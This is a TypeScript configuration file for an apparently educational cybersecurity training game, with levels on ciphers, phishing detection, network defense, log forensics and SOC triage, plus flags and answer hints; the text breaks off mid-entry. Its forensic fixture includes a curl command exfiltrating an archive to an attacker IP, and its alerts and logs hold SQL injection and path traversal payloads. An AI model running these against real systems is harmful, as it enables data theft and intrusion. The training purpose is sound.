import type { CodexEntryId, LevelId } from "@/types/study";

export interface CodexEntry {
  id: CodexEntryId;
  title: string;
  method: string;
  analysis: string[];
  note: string[];
}

export interface CaesarLevelConfig {
  id: "caesar-cipher";
  title: string;
  mission: string;
  ciphertext: string;
  targetShift: number;
  plaintext: string;
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface XorLevelConfig {
  id: "xor-stream";
  title: string;
  mission: string;
  rulePairs: Array<{
    left: string;
    right: string;
    output: string;
  }>;
  recoveryCipherBits: string;
  recoveryKeyBits: string;
  recoveryPlaintextBits: string;
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface BlockChoice {
  id: string;
  label: string;
  helper: string;
}

export interface BlockCipherLevelConfig {
  id: "block-cipher";
  title: string;
  mission: string;
  slotLabels: string[];
  correctSequence: string[];
  choices: BlockChoice[];
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface SuspiciousElement {
  id: string;
  type: "domain" | "url" | "urgency" | "impersonation" | "attachment" | "grammar";
  text: string;
  explanation: string;
}

export interface PhishingEmail {
  id: string;
  from: { name: string; address: string };
  to: string;
  subject: string;
  timestamp: string;
  bodyLines: string[];
  isPhishing: boolean;
  suspicious: SuspiciousElement[];
}

export interface PhishingInspectorLevelConfig {
  id: "phishing-inspector";
  title: string;
  mission: string;
  emails: PhishingEmail[];
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface NetworkNode {
  id: string;
  type: "server" | "workstation" | "router" | "database" | "internet";
  label: string;
  x: number;
  y: number;
  critical: boolean;
  acceptsDefense: boolean;
}

export interface NetworkEdge {
  from: string;
  to: string;
}

export interface DefenseTool {
  id: string;
  label: string;
  description: string;
  effectiveAgainst: string[];
  count: number;
}

export interface Threat {
  id: string;
  type: "virus" | "phishing" | "ddos" | "ransomware" | "data-exfil";
  label: string;
  path: string[];
  blockedBy: string[];
}

export interface NetworkDefenseLevelConfig {
  id: "network-defense";
  title: string;
  mission: string;
  nodes: NetworkNode[];
  edges: NetworkEdge[];
  defenseTools: DefenseTool[];
  threats: Threat[];
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface VirtualFile {
  path: string;
  content: string;
}

export interface ForensicsObjective {
  id: string;
  prompt: string;
  answer: string;
  hint: string;
}

export interface TerminalForensicsLevelConfig {
  id: "terminal-forensics";
  title: string;
  mission: string;
  filesystem: VirtualFile[];
  objectives: ForensicsObjective[];
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface AttackVector {
  id: "sql-injection" | "brute-force" | "directory-traversal";
  label: string;
  shortcut: string;
  prompt: string;
  exampleParam: string;
  logRows: Array<{ eventType: string; detailTemplate: string }>;
}

export interface NoiseLogRow {
  timestamp: string;
  sourceIp: string;
  eventType: string;
  details: string;
}

export interface DualRoleDefenderLevelConfig {
  id: "dual-role-defender";
  title: string;
  mission: string;
  attackVectors: AttackVector[];
  noiseRows: NoiseLogRow[];
  attackerIps: string[];
  flag: string;
  successMessage: string;
  hints: string[];
}

export interface SocAlert {
  id: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  rule: string;
  sourceIp: string;
  payloadSnippet: string;
  time: string;
  isThreat: boolean;
  explanation: string;
}

export interface SocTriageLevelConfig {
  id: "soc-triage";
  title: string;
  mission: string;
  alerts: SocAlert[];
  passingThreshold: number;
  flag: string;
  successMessage: string;
  hints: string[];
}

export type GameplayLevelConfig =
  | CaesarLevelConfig
  | XorLevelConfig
  | BlockCipherLevelConfig
  | PhishingInspectorLevelConfig
  | NetworkDefenseLevelConfig
  | TerminalForensicsLevelConfig
  | DualRoleDefenderLevelConfig
  | SocTriageLevelConfig;

export const levelOrder: LevelId[] = [
  "block-cipher",
  "phishing-inspector",
  "terminal-forensics",
];

// ── LEVEL 1: Caesar Cipher ───────────────────────────────────────────────────

export const caesarLevel: CaesarLevelConfig = {
  id: "caesar-cipher",
  title: "Transmission Alpha",
  mission:
    "Alpha channel arrived encoded. Sweep the frequency dial until the intercept resolves and the source traffic aligns into readable text.",
  ciphertext: "PHHW DW WKH GRFN -- PLGQLJKW\nEORRG PRRQ ULVHV WRPRUURZ",
  targetShift: 3,
  plaintext: "MEET AT THE DOCK -- MIDNIGHT\nBLOOD MOON RISES TOMORROW",
  flag: "FLAG{c4es4r_sh1ft_3}",
  successMessage:
    "Transmission Alpha decrypted. Coordinates and the word RENDEZVOUS recovered.",
  hints: [
    "The shift value is likely small. Start in the single digits.",
    "All visible intercepts come from the same source, so one key should clean up every message.",
    "A fixed alphabetic shift of 3 resolves the Alpha channel.",
  ],
};

// ── LEVEL 2: XOR Stream ──────────────────────────────────────────────────────

export const xorLevel: XorLevelConfig = {
  id: "xor-stream",
  title: "Transmission Bravo",
  mission:
    "Bravo channel is scrambled. Calibrate the bitwise decode rule first, then apply the same transform to recover the intercepted signal.",
  rulePairs: [
    { left: "1", right: "1", output: "0" },
    { left: "0", right: "1", output: "1" },
    { left: "1", right: "0", output: "1" },
    { left: "0", right: "0", output: "0" },
  ],
  recoveryCipherBits: "0110",
  recoveryKeyBits: "1100",
  recoveryPlaintextBits: "1010",
  flag: "FLAG{x0r_d3c0d3d_1010}",
  successMessage:
    "Transmission Bravo decrypted. The transfer window and confirmation phrase are now readable.",
  hints: [
    "Start with the core XOR rule: matching bits produce 0.",
    "Different bits produce 1. Apply the same rule to every recovery column.",
    "Use the calibrated rule straight across the row: 0110 XOR 1100 resolves to 1010.",
  ],
};

// ── LEVEL 3: Block Cipher ────────────────────────────────────────────────────

export const blockCipherLevel: BlockCipherLevelConfig = {
  id: "block-cipher",
  title: "Transmission Charlie",
  mission:
    "The final cipher transmission is incoming. Configure our outbound encryption pipeline correctly before the response window closes — or the adversary will see our reply in plaintext.",
  slotLabels: [
    "Input Hopper",
    "Mixing Chamber",
    "Key Lock",
    "Processor",
    "Output Tank",
  ],
  correctSequence: [
    "plaintext",
    "iv",
    "key",
    "encrypt",
    "ciphertext",
  ],
  choices: [
    { id: "plaintext", label: "PLAINTEXT", helper: "Source data entering the pipeline." },
    { id: "iv", label: "IV", helper: "Fresh randomiser mixed in before encryption." },
    { id: "key", label: "KEY", helper: "Secret material that drives the cipher." },
    { id: "encrypt", label: "ENCRYPT", helper: "Processing stage that transforms the blocks." },
    { id: "ciphertext", label: "CIPHERTEXT", helper: "Protected output leaving the network." },
  ],
  flag: "FLAG{cbc_p1p3l1n3_s3cur3d}",
  successMessage:
    "Pipeline stabilised. The repeated pattern disappeared from the attacker intercept.",
  hints: [
    "Plaintext enters first and ciphertext exits last.",
    "The IV randomises the first block. It is not the secret key.",
    "One valid flow is Plaintext -> IV -> Key -> Encrypt -> Ciphertext.",
  ],
};

// ── LEVEL 4: Phishing Inspector ──────────────────────────────────────────────

export const phishingInspectorLevel: PhishingInspectorLevelConfig = {
  id: "phishing-inspector",
  title: "Transmission Delta",
  mission:
    "Intel flagged suspicious outbound email activity originating inside our network. Review each intercepted message and classify it — PHISHING or LEGITIMATE. Mark every red flag you find before submitting your verdict.",
  emails: [
    {
      id: "email-1",
      from: { name: "IT Security Team", address: "security@corp-it-helpdesk.net" },
      to: "analyst@sigint.local",
      subject: "URGENT: Your password expires in 24 hours — action required",
      timestamp: "04:12:33 UTC",
      bodyLines: [
        "Dear Analyst,",
        "",
        "Your account password will expire in 24 HOURS.",
        "Failure to update your credentials will result in IMMEDIATE account suspension.",
        "",
        "Click here to update now: http://corp-password-reset.xyz/login",
        "",
        "If you do not act within 24 hours, IT will lock your account.",
        "",
        "— IT Security Team",
        "corp-it-helpdesk.net",
      ],
      isPhishing: true,
      suspicious: [
        {
          id: "s1-domain",
          type: "domain",
          text: "corp-it-helpdesk.net",
          explanation: "The sender domain 'corp-it-helpdesk.net' is not an official company domain. Legitimate IT teams use the company's own domain.",
        },
        {
          id: "s1-urgency",
          type: "urgency",
          text: "URGENT: Your password expires in 24 hours",
          explanation: "Artificial urgency ('24 hours', 'IMMEDIATE suspension') is a classic phishing pressure tactic to prevent careful thinking.",
        },
        {
          id: "s1-url",
          type: "url",
          text: "http://corp-password-reset.xyz/login",
          explanation: "The link uses a suspicious external domain (.xyz) and HTTP instead of HTTPS. Legitimate internal systems use the company domain.",
        },
      ],
    },
    {
      id: "email-2",
      from: { name: "Sarah Chen", address: "s.chen@sigint.local" },
      to: "analyst@sigint.local",
      subject: "Team lunch — Friday 12:30",
      timestamp: "08:47:15 UTC",
      bodyLines: [
        "Hey,",
        "",
        "Booking a table at the usual place this Friday at 12:30.",
        "Let me know if you can make it.",
        "",
        "Sarah",
      ],
      isPhishing: false,
      suspicious: [],
    },
    {
      id: "email-3",
      from: { name: "DocuSign", address: "dse@docusign-secure-notifications.com" },
      to: "analyst@sigint.local",
      subject: "You have a document waiting for your signature",
      timestamp: "09:03:51 UTC",
      bodyLines: [
        "DocuSign Notification",
        "",
        "SIGINT Operations has sent you a document to review and sign.",
        "",
        "Document: Q4 Budget Approval (CONFIDENTIAL)",
        "",
        "Review and sign: https://docusign-secure-notifications.com/sign?doc=8f2ka",
        "",
        "This link expires in 48 hours.",
        "",
        "DocuSign",
        "Electronic Signature Service",
      ],
      isPhishing: true,
      suspicious: [
        {
          id: "s3-domain",
          type: "impersonation",
          text: "docusign-secure-notifications.com",
          explanation: "Real DocuSign emails come from 'docusign.com' or 'docusign.net'. This domain 'docusign-secure-notifications.com' is a lookalike designed to deceive.",
        },
        {
          id: "s3-url",
          type: "url",
          text: "https://docusign-secure-notifications.com/sign?doc=8f2ka",
          explanation: "The link goes to the attacker's domain, not docusign.com. Hovering over links before clicking reveals the true destination.",
        },
      ],
    },
  ],
  flag: "FLAG{ph1sh_d3t3ct3d_3m4il}",
  successMessage:
    "Phishing campaign identified. Source traced to external threat actor. All suspicious emails quarantined.",
  hints: [
    "Check the sender's full email address, not just the display name — attackers spoof display names.",
    "Look for urgency language, threats of account suspension, and countdown timers — these are pressure tactics.",
    "Hover over links (or read them carefully) — the domain in the URL should match the company it claims to be from.",
  ],
};

// ── LEVEL 5: Network Defense ─────────────────────────────────────────────────

export const networkDefenseLevel: NetworkDefenseLevelConfig = {
  id: "network-defense",
  title: "Transmission Echo",
  mission:
    "The phishing campaign opened a beachhead. Threat actors are now probing our network. Place your defensive tools on network nodes before activating — each tool blocks specific threat types. Protect the database and the internal server at all costs.",
  nodes: [
    { id: "internet", type: "internet", label: "INTERNET", x: 50, y: 50, critical: false, acceptsDefense: false },
    { id: "router", type: "router", label: "EDGE ROUTER", x: 200, y: 50, critical: false, acceptsDefense: true },
    { id: "workstation-1", type: "workstation", label: "WORKSTATION A", x: 100, y: 180, critical: false, acceptsDefense: true },
    { id: "workstation-2", type: "workstation", label: "WORKSTATION B", x: 300, y: 180, critical: false, acceptsDefense: true },
    { id: "server", type: "server", label: "INTERNAL SERVER", x: 200, y: 310, critical: true, acceptsDefense: true },
    { id: "database", type: "database", label: "DATABASE", x: 350, y: 310, critical: true, acceptsDefense: true },
  ],
  edges: [
    { from: "internet", to: "router" },
    { from: "router", to: "workstation-1" },
    { from: "router", to: "workstation-2" },
    { from: "workstation-1", to: "server" },
    { from: "workstation-2", to: "server" },
    { from: "server", to: "database" },
  ],
  defenseTools: [
    {
      id: "firewall",
      label: "FIREWALL",
      description: "Blocks unauthorised network traffic at the perimeter.",
      effectiveAgainst: ["ddos", "virus"],
      count: 2,
    },
    {
      id: "ids",
      label: "IDS",
      description: "Intrusion Detection System — monitors for anomalous patterns.",
      effectiveAgainst: ["data-exfil", "ransomware"],
      count: 2,
    },
    {
      id: "antivirus",
      label: "ANTIVIRUS",
      description: "Detects and removes malicious code on endpoints.",
      effectiveAgainst: ["virus", "ransomware"],
      count: 2,
    },
    {
      id: "encryption",
      label: "ENCRYPTION",
      description: "Encrypts data at rest — renders exfiltrated data unreadable.",
      effectiveAgainst: ["data-exfil"],
      count: 1,
    },
  ],
  threats: [
    {
      id: "t1",
      type: "ddos",
      label: "DDoS FLOOD",
      path: ["internet", "router", "server"],
      blockedBy: ["firewall"],
    },
    {
      id: "t2",
      type: "virus",
      label: "WORM",
      path: ["internet", "router", "workstation-1", "server"],
      blockedBy: ["firewall", "antivirus"],
    },
    {
      id: "t3",
      type: "data-exfil",
      label: "DATA EXFIL",
      path: ["internet", "router", "workstation-2", "server", "database"],
      blockedBy: ["ids", "encryption"],
    },
    {
      id: "t4",
      type: "ransomware",
      label: "RANSOMWARE",
      path: ["internet", "router", "workstation-1", "server", "database"],
      blockedBy: ["ids", "antivirus"],
    },
  ],
  flag: "FLAG{n3tw0rk_d3f3ns3_h3ld}",
  successMessage:
    "All threats neutralised. Network perimeter secured. Breach logs detected in server — forensic analysis required.",
  hints: [
    "Place defenses where threat paths converge — the router and server are high-traffic nodes.",
    "Each tool only blocks certain threat types. Match the defense to the threat: Firewall blocks DDoS, IDS blocks exfiltration.",
    "The database is critical — make sure its access path has at least one defense against every threat reaching it.",
  ],
};

// ── LEVEL 6: Terminal Forensics ──────────────────────────────────────────────

export const terminalForensicsLevel: TerminalForensicsLevelConfig = {
  id: "terminal-forensics",
  title: "Transmission Foxtrot",
  mission:
    "Breach logs detected on the internal server. Access the forensic terminal, investigate the logs and file system, and answer the investigation objectives. Find what happened, who did it, and what they took.",
  filesystem: [
    {
      path: "/",
      content: "auth.log  system.log  access.log  /home  /var  /etc",
    },
    {
      path: "/home",
      content: "analyst  root  ghost-user",
    },
    {
      path: "/var",
      content: "exfil-package.zip  temp",
    },
    {
      path: "/etc",
      content: "passwd  hosts  cron.d",
    },
    {
      path: "/etc/passwd",
      content: "root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000::/home/analyst:/bin/bash\nghost-user:x:1001:1001::/home/ghost-user:/bin/bash",
    },
    {
      path: "/etc/hosts",
      content: "127.0.0.1  localhost\n10.0.0.1   sigint.local\n10.0.0.2   db.sigint.local",
    },
    {
      path: "auth.log",
      content: `[04:15:22] INFO  Login: analyst from 10.0.0.45
[04:16:08] INFO  Login: analyst from 10.0.0.45
[04:31:47] WARN  Failed login: root from 192.168.99.201
[04:31:51] WARN  Failed login: root from 192.168.99.201
[04:31:55] WARN  Failed login: root from 192.168.99.201
[04:32:01] CRIT  Login: root from 192.168.99.201
[04:32:14] INFO  Sudo: root — command: useradd ghost-user
[04:33:02] INFO  Login: ghost-user from 192.168.99.201
[05:12:44] INFO  Logout: ghost-user`,
    },
    {
      path: "system.log",
      content: `[04:30:00] INFO  System health check OK
[04:32:10] WARN  New user created: ghost-user by root
[04:33:05] INFO  Process started: /bin/bash — user: ghost-user
[04:45:11] WARN  Large file write detected: /var/exfil-package.zip (2.4GB)
[04:45:33] WARN  Outbound connection: 192.168.99.201:4444
[05:12:44] INFO  Process exited: /bin/bash — user: ghost-user`,
    },
    {
      path: "access.log",
      content: `[04:15:22] GET  /dashboard  200  analyst
[04:33:10] GET  /admin/users  200  ghost-user
[04:33:44] GET  /admin/export  200  ghost-user
[04:44:58] POST /api/upload  413  ghost-user
[04:45:11] PUT  /var/exfil-package.zip  200  ghost-user`,
    },
    {
      path: "/home/ghost-user",
      content: ".bash_history  .profile",
    },
    {
      path: "/home/ghost-user/.bash_history",
      content: `whoami
id
cat /etc/passwd
ls /var
zip -r /var/exfil-package.zip /home /etc
curl -T /var/exfil-package.zip ftp://192.168.99.201/stolen/
exit`,
    },
  ],
  objectives: [
    {
      id: "obj-1",
      prompt: "What external IP address made the unauthorised login? (type: check IP)",
      answer: "192.168.99.201",
      hint: "Read auth.log and look for failed logins followed by a successful root login from an external IP.",
    },
    {
      id: "obj-2",
      prompt: "What account did the attacker create after gaining root? (type: check account)",
      answer: "ghost-user",
      hint: "After the root login in auth.log, look for a useradd command. Also check /etc/passwd.",
    },
    {
      id: "obj-3",
      prompt: "What file did the attacker exfiltrate? (type: check file)",
      answer: "exfil-package.zip",
      hint: "Check system.log for large file writes, or look at /home/ghost-user/.bash_history.",
    },
  ],
  flag: "FLAG{f0r3ns1cs_br34ch_c0nt41n3d}",
  successMessage:
    "Breach fully investigated. Attacker IP identified, rogue account flagged, exfiltrated package traced. Operation Signal Ghost: COMPLETE.",
  hints: [
    "Start with 'ls' to see the files, then 'cat auth.log' to begin your investigation.",
    "The auth.log shows login events — look for repeated failed attempts followed by a success from an unusual IP.",
    "Check the .bash_history file in the attacker's home directory — it shows every command they ran.",
  ],
};

// ── LEVEL 7: Dual-Role Defender ──────────────────────────────────────────────

export const dualRoleDefenderLevel: DualRoleDefenderLevelConfig = {
  id: "dual-role-defender",
  title: "Transmission Golf",
  mission:
    "Signal Ghost has gone active. To understand how to catch the attacker, you must first become them. Launch a simulated intrusion — then switch sides and identify your own attack in the log stream.",
  attackVectors: [
    {
      id: "sql-injection",
      label: "SQL INJECTION",
      shortcut: "A",
      prompt: "Enter target table name:",
      exampleParam: "users",
      logRows: [
        { eventType: "DB_QUERY_ERROR", detailTemplate: "UNION SELECT attempt on table [{param}] — syntax error in WHERE clause" },
        { eventType: "WAF_ALERT",      detailTemplate: "Blocked payload: ' OR 1=1; DROP TABLE {param};--" },
        { eventType: "DB_ACCESS",      detailTemplate: "Repeated query to [{param}]: SELECT * FROM {param} WHERE id=1 UNION SELECT..." },
        { eventType: "DB_ERROR",       detailTemplate: "Query from external IP to [{param}] — column count mismatch in UNION" },
      ],
    },
    {
      id: "brute-force",
      label: "BRUTE FORCE LOGIN",
      shortcut: "B",
      prompt: "Enter target username:",
      exampleParam: "admin",
      logRows: [
        { eventType: "AUTH_FAILURE",  detailTemplate: "Failed login attempt for user [{param}] — attempt 1 of many" },
        { eventType: "AUTH_FAILURE",  detailTemplate: "Failed login attempt for user [{param}] — password incorrect" },
        { eventType: "AUTH_FAILURE",  detailTemplate: "47 failed login attempts for [{param}] in 90 seconds from same IP" },
        { eventType: "AUTH_LOCKOUT",  detailTemplate: "Account [{param}] temporarily locked — threshold exceeded" },
      ],
    },
    {
      id: "directory-traversal",
      label: "DIRECTORY TRAVERSAL",
      shortcut: "C",
      prompt: "Enter target path:",
      exampleParam: "/etc/passwd",
      logRows: [
        { eventType: "HTTP_403",      detailTemplate: "GET /../../../{param} — forbidden path traversal attempt" },
        { eventType: "FILE_ACCESS",   detailTemplate: "Attempted read of {param} via traversal: ../../.." },
        { eventType: "WAF_ALERT",     detailTemplate: "Traversal pattern detected in request path targeting [{param}]" },
        { eventType: "HTTP_400",      detailTemplate: "Malformed path: /app/data/../../{param} — request rejected" },
      ],
    },
  ],
  noiseRows: [
    { timestamp: "04:01:12", sourceIp: "10.0.1.5",   eventType: "HEALTH_CHECK",   details: "Automated health-check ping — status 200 OK" },
    { timestamp: "04:03:44", sourceIp: "10.0.2.18",  eventType: "CDN_REQUEST",    details: "CDN cache refresh — static assets /dist/app.js" },
    { timestamp: "04:07:22", sourceIp: "10.0.1.30",  eventType: "CRON_JOB",      details: "Scheduled backup task — /var/backup/nightly.tar.gz" },
    { timestamp: "04:11:09", sourceIp: "10.0.0.1",   eventType: "DNS_QUERY",      details: "Standard DNS resolution — api.internal.corp" },
    { timestamp: "04:15:55", sourceIp: "10.0.3.7",   eventType: "API_CALL",       details: "Developer API call — GET /v2/metrics — 200 OK" },
    { timestamp: "04:19:33", sourceIp: "10.0.1.5",   eventType: "HEALTH_CHECK",   details: "Automated health-check ping — status 200 OK" },
    { timestamp: "04:23:41", sourceIp: "10.0.2.99",  eventType: "LOG_ROTATE",     details: "System log rotation completed — /var/log/app.log" },
    { timestamp: "04:27:08", sourceIp: "10.0.0.1",   eventType: "NTP_SYNC",       details: "Network time sync — offset 0.003s" },
  ],
  attackerIps: ["10.0.4.77", "10.0.4.33", "172.16.8.201", "192.168.50.12"],
  flag: "FLAG{4tt4ck3r_m1nd53t}",
  successMessage:
    "Attack vector confirmed. You launched it — and you caught it. Attacker mindset logged to Signal Ghost dossier.",
  hints: [
    "The attacker's source IP appears in multiple log rows — look for the same IP in repeated entries.",
    "The event type in the log rows will match the attack you chose — SQL, AUTH, or traversal patterns.",
    "Your exact target parameter appears in the log details. Look for the value you entered in phase 1.",
  ],
};

// ── LEVEL 8: SOC Triage ──────────────────────────────────────────────────────

export const socTriageLevel: SocTriageLevelConfig = {
  id: "soc-triage",
  title: "Transmission Hotel",
  mission:
    "You are now in the Security Operations Centre. Eight alerts have fired. Your mission: classify each one as a real threat (ESCALATE) or a false positive (DISMISS). Six correct calls required to clear the queue and close the mission.",
  alerts: [
    {
      id: "A1",
      severity: "CRITICAL",
      rule: "SQLI_UNION_SELECT",
      sourceIp: "185.234.218.44",
      payloadSnippet: "' UNION SELECT username,password FROM users--",
      time: "04:12:08",
      isThreat: true,
      explanation: "Real SQL injection payload. The UNION SELECT pattern targets credential tables directly.",
    },
    {
      id: "A2",
      severity: "MEDIUM",
      rule: "OUTBOUND_HTTP_NON_STANDARD_PORT",
      sourceIp: "10.0.1.5",
      payloadSnippet: "GET /health HTTP/1.1 — port 8443",
      time: "04:14:22",
      isThreat: false,
      explanation: "CDN health-check on port 8443. Known internal IP, fixed schedule — false positive.",
    },
    {
      id: "A3",
      severity: "HIGH",
      rule: "NMAP_SYN_SCAN",
      sourceIp: "91.108.56.17",
      payloadSnippet: "SYN packets to ports 22,80,443,3306,5432 — 400ms sweep",
      time: "04:17:45",
      isThreat: true,
      explanation: "External IP performing a rapid SYN sweep across 5 ports. Classic Nmap reconnaissance.",
    },
    {
      id: "A4",
      severity: "HIGH",
      rule: "AUTH_BYPASS_ATTEMPT",
      sourceIp: "10.0.3.7",
      payloadSnippet: "Authorization: Bearer admin-dev-key-7f3a",
      time: "04:19:01",
      isThreat: false,
      explanation: "Developer API key containing 'admin' in name triggered the rule. Internal dev IP, legitimate traffic — false positive.",
    },
    {
      id: "A5",
      severity: "CRITICAL",
      rule: "DNS_TUNNELING_DETECTED",
      sourceIp: "10.0.2.44",
      payloadSnippet: "TXT query: a9f3b.c2channel.badactor.net (entropy: 4.91)",
      time: "04:22:37",
      isThreat: true,
      explanation: "High-entropy DNS TXT query to an unknown external domain. Classic DNS tunnelling C2 beacon signature.",
    },
    {
      id: "A6",
      severity: "MEDIUM",
      rule: "INTERNAL_PORT_SCAN",
      sourceIp: "10.0.0.50",
      payloadSnippet: "ICMP + TCP probes to 10.0.0.0/24 — sequential sweep",
      time: "04:25:14",
      isThreat: false,
      explanation: "10.0.0.50 is the registered IT asset scanner. This IP is whitelisted for scheduled weekly scans — false positive.",
    },
    {
      id: "A7",
      severity: "CRITICAL",
      rule: "AUTH_FAILURE_THRESHOLD",
      sourceIp: "203.0.113.42",
      payloadSnippet: "47 failed logins for user 'root' in 90 seconds",
      time: "04:28:59",
      isThreat: true,
      explanation: "47 failed root login attempts in 90 seconds from an external IP. Active brute-force attack.",
    },
    {
      id: "A8",
      severity: "LOW",
      rule: "REPEATED_DB_QUERY",
      sourceIp: "10.0.1.8",
      payloadSnippet: "SELECT id,status FROM jobs WHERE status='pending' — every 60s",
      time: "04:31:03",
      isThreat: false,
      explanation: "Cron job polling a jobs queue every 60 seconds. Same query, fixed interval, internal IP — false positive.",
    },
  ],
  passingThreshold: 6,
  flag: "FLAG{s0c_4n4lyst}",
  successMessage:
    "Alert queue cleared. Triage complete. Signal Ghost operation: MISSION ACCOMPLISHED.",
  hints: [
    "Check source IPs — internal IPs (10.x.x.x) are more likely to be false positives from known systems.",
    "Look at the payload snippet carefully. Real attacks have recognisable patterns: SQL keywords, high-entropy strings, known scan signatures.",
    "Scheduled and automated systems (cron jobs, health checks, asset scanners) generate legitimate alerts that look suspicious.",
  ],
};

// ── Level map ────────────────────────────────────────────────────────────────

export const gameplayLevels: GameplayLevelConfig[] = [
  caesarLevel,
  xorLevel,
  blockCipherLevel,
  phishingInspectorLevel,
  networkDefenseLevel,
  terminalForensicsLevel,
  dualRoleDefenderLevel,
  socTriageLevel,
];

// ── Transition beats between levels ─────────────────────────────────────────

export const transitionBeats: Record<
  Exclude<LevelId, "terminal-forensics" | "network-defense" | "dual-role-defender" | "soc-triage">,
  { lines: string[]; action: string }
> = {
  "caesar-cipher": {
    lines: [
      "// ALPHA CHANNEL SECURED",
      "// COORDINATES EMBEDDED: 48.2082°N 16.3738°E",
      "// NEW INTERCEPT DETECTED -- BRAVO CHANNEL",
      "// SIGNAL TYPE: UNKNOWN BITWISE ENCODING",
    ],
    action: "// [OPEN BRAVO CHANNEL]",
  },
  "xor-stream": {
    lines: [
      "// BRAVO CHANNEL CLEARED",
      "// KEY FRAGMENT RECOVERED: 0x7A",
      "// FINAL CIPHER TRANSMISSION -- CHARLIE CHANNEL",
      "// ADVERSARY HAS UPGRADED ENCRYPTION",
    ],
    action: "// [OPEN CHARLIE CHANNEL]",
  },
  "block-cipher": {
    lines: [
      "// SECURE CHANNEL ESTABLISHED",
      "// ALERT: SUSPICIOUS EMAIL DETECTED IN OUTBOUND QUEUE",
      "// PHISHING CAMPAIGN SUSPECTED -- DELTA CHANNEL",
      "// ANALYST INSPECTION REQUIRED",
    ],
    action: "// [OPEN DELTA CHANNEL]",
  },
  "phishing-inspector": {
    lines: [
      "// PHISHING CAMPAIGN CONFIRMED",
      "// SOURCE TRACED TO EXTERNAL THREAT ACTOR",
      "// BREACH LOGS DETECTED ON INTERNAL SERVER",
      "// FORENSIC ANALYSIS REQUIRED -- FOXTROT CHANNEL",
    ],
    action: "// [OPEN FOXTROT CHANNEL]",
  },
};

// ── Level ready status lines ─────────────────────────────────────────────────

export const levelReadyStatuses: Record<LevelId, string> = {
  "caesar-cipher": "// ALPHA CHANNEL OPEN -- SWEEP FOR A LEGIBLE TRANSMISSION",
  "xor-stream": "// BRAVO CHANNEL OPEN -- CALIBRATE THE DECODE RULE",
  "block-cipher": "// CHARLIE CHANNEL OPEN -- CONFIGURE A SECURE RESPONSE",
  "phishing-inspector": "// DELTA CHANNEL OPEN -- INSPECT INTERCEPTED EMAILS",
  "network-defense": "// ECHO CHANNEL OPEN -- DEPLOY YOUR DEFENSES",
  "terminal-forensics": "// FOXTROT CHANNEL OPEN -- BEGIN FORENSIC INVESTIGATION",
  "dual-role-defender": "// GOLF CHANNEL OPEN -- SELECT ATTACK VECTOR AND SWITCH SIDES",
  "soc-triage": "// HOTEL CHANNEL OPEN -- TRIAGE THE ALERT QUEUE",
};

// ── Task IDs for telemetry ───────────────────────────────────────────────────

export const taskIds: Record<LevelId, string> = {
  "caesar-cipher": "shift-control",
  "xor-stream": "signal-repair",
  "block-cipher": "role-sequence",
  "phishing-inspector": "email-inspection",
  "network-defense": "defense-deployment",
  "terminal-forensics": "forensic-investigation",
  "dual-role-defender": "dual-role-simulation",
  "soc-triage": "soc-triage",
};

// ── Codex entries ────────────────────────────────────────────────────────────

export const codexEntries: Record<CodexEntryId, CodexEntry> = {
  "caesar-cipher": {
    id: "caesar-cipher",
    title: "Signal Log -- Entry 1",
    method: "ALPHABETIC SHIFT CIPHER",
    analysis: [
      "The Alpha channel used a fixed-offset letter substitution.",
      "Every letter in the plaintext was shifted the same number of positions forward in the alphabet. The shift value was the key.",
    ],
    note: [
      "This method is trivially broken by frequency analysis or brute force.",
      "All 26 possible shifts can be tested in seconds. Modern use: none. Historical use: common pre-19th century.",
    ],
  },
  "xor-stream": {
    id: "xor-stream",
    title: "Signal Log -- Entry 2",
    method: "BITWISE XOR WITH KEY STREAM",
    analysis: [
      "The Bravo channel applied an XOR operation between the plaintext bits and a repeating key stream.",
      "XOR is invertible. Applying the same key to the ciphertext recovers the plaintext.",
    ],
    note: [
      "XOR is the foundation of stream ciphers and block cipher modes.",
      "The weakness here was key reuse. If the key stream repeats or is known, the cipher provides no security.",
    ],
  },
  "block-cipher": {
    id: "block-cipher",
    title: "Signal Log -- Entry 3",
    method: "BLOCK CIPHER, CBC MODE",
    analysis: [
      "The Charlie channel used a block cipher in CBC mode.",
      "The plaintext is split into fixed-size blocks. Each block is XORed with the previous ciphertext block (or the IV for the first block) before encryption with the key.",
    ],
    note: [
      "The IV ensures identical plaintexts produce different ciphertexts.",
      "The key is secret; the IV is not. Confusing the two breaks the scheme.",
    ],
  },
  "phishing-inspector": {
    id: "phishing-inspector",
    title: "Signal Log -- Entry 4",
    method: "SOCIAL ENGINEERING / PHISHING",
    analysis: [
      "The Delta channel revealed a coordinated phishing campaign targeting analyst credentials.",
      "Attackers spoofed display names and used lookalike domains to impersonate trusted services.",
    ],
    note: [
      "Always inspect the full sender email address — display names are trivially spoofed.",
      "Urgency, threats, and countdown timers are pressure tactics. Slow down and verify through official channels before clicking.",
    ],
  },
  "network-defense": {
    id: "network-defense",
    title: "Signal Log -- Entry 5",
    method: "NETWORK DEFENSE IN DEPTH",
    analysis: [
      "The Echo channel required deploying layered defenses across a compromised network topology.",
      "Different threat types require different countermeasures — no single tool stops all attacks.",
    ],
    note: [
      "Defense in depth means placing multiple overlapping controls so that one failure does not compromise the system.",
      "Critical assets (databases, servers) should always be protected by at least two independent controls.",
    ],
  },
  "terminal-forensics": {
    id: "terminal-forensics",
    title: "Signal Log -- Entry 6",
    method: "INCIDENT RESPONSE / LOG FORENSICS",
    analysis: [
      "The Foxtrot channel contained a live breach scenario requiring log-based forensic investigation.",
      "The attacker brute-forced root, created a backdoor account, and exfiltrated data via FTP.",
    ],
    note: [
      "Logs are the primary evidence trail in incident response. Auth.log, system.log, and access.log each reveal different attack phases.",
      "Attackers often leave traces in .bash_history and newly created accounts. After containment, rotate all credentials and audit all user accounts.",
    ],
  },
  "dual-role-defender": {
    id: "dual-role-defender",
    title: "Signal Log -- Entry 7",
    method: "OFFENSIVE SECURITY / ATTACKER MINDSET",
    analysis: [
      "The Golf channel required simulating an active intrusion, then identifying that same attack in a noisy log stream.",
      "SQL injection, brute-force, and directory traversal each produce distinct log signatures that are easy to spot once you know the pattern.",
    ],
    note: [
